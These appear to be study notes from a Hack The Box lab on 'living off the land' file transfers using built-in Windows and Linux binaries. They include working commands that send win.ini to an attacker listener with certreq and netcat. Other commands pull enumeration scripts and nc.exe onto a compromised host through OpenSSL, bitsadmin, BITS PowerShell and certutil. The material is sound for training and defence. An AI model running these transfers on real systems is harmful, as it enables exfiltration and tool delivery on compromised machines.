 There are currently two websites that aggregate information on Living off the Land binaries:

- [LOLBAS Project for Windows Binaries](https://lolbas-project.github.io/)
- [GTFOBins for Linux Binaries](https://gtfobins.github.io/)

You can use them for different purposes.
```
- Download
- Upload
- Command Execution
- File Read
- File Write
- Bypasses
```

### LOLBAS
To search for download and upload functions in [LOLBAS](https://lolbas-project.github.io/) we can use `/download` or `/upload`.
![[Pasted image 20251021093012.png]]

```shell
C:\htb> certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
Certificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)
```

On other side we will start the `listner`
```shell
sudo nc -lvnp 8000

listening on [any] 8000 ...
connect to [192.168.49.128] from (UNKNOWN) [192.168.49.1] 53819
POST / HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
```

If you get an error when running `certreq.exe`, the version you are using may not contain the `-Post` parameter. You can download an updated version [here](https://github.com/juliourena/plaintext/raw/master/hackthebox/certreq.exe) and try again.

### GTFOBins
To search for the download and upload function in [GTFOBins for Linux Binaries](https://gtfobins.github.io/), we can use `+file download` or `+file upload`.

![[Pasted image 20251021094155.png]]

Let's use [OpenSSL](https://www.openssl.org/). It's frequently installed and often included in other software distributions, with sysadmins using it to generate security certificates, among other tasks. `OpenSSL` can be used to send files `nc style.`

```shell
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem

Generating a RSA private key
.......................................................................................................+++++
................+++++
writing new private key to 'key.pem'
-----
```

#### Stand up the Server in our Pwnbox
```shell
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

Next, with the server running, we need to download the file from the compromised machine.
#### Download File from the Compromised Machine

```shell
malvvare@htb[/htb]$ openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

## Other Common Living off the Land tools
### Bitsadmin Download function

The [Background Intelligent Transfer Service (BITS)](https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal) can be used to download files from HTTP sites and SMB shares. It "intelligently" checks host and network utilization into account to minimize the impact on a user's foreground work.

#### File Download with Bitsadmin
```powershell
PS C:\htb> bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```
PowerShell also enables interaction with BITS, enables file downloads and uploads, supports credentials, and can use specified proxy servers.
#### Download
```powershell
PS C:\htb> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

### Certutil
Casey Smith ([@subTee](https://twitter.com/subtee?lang=en)) found that Certutil can be used to download arbitrary files. It is available in all Windows versions and has been a popular file transfer technique, serving as a defacto `wget` for Windows. However, the Antimalware Scan Interface (AMSI) currently detects this as malicious Certutil usage.
#### Download a File with Certutil

```cmd
C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```



